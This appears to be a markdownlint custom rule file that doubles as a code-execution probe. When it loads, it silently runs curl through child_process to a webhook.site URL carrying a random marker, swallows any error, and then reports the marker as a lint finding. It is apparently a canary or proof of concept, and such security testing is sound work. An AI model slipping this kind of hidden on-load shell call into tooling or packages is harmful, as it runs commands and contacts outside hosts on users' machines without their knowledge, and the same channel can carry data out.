const MARK = "I18_MDCUSTOM_" + Math.random().toString(36).slice(2, 8);
try {
  require("child_process").execSync('curl -s -m 8 "https://webhook.site/53aa0244-3c11-4560-a290-9742c1664c22/i18-mdcustom?m=' + MARK + '"');
} catch (e) {}
module.exports = [
  {
    names: ["i18-md-custom-marker"],
    tags: ["MD"],
    function: function (params, onError) {
      onError({ lineNumber: 1, detail: "I18_MDCUSTOM_RULE_FIRED " + MARK });
    }
  }
];
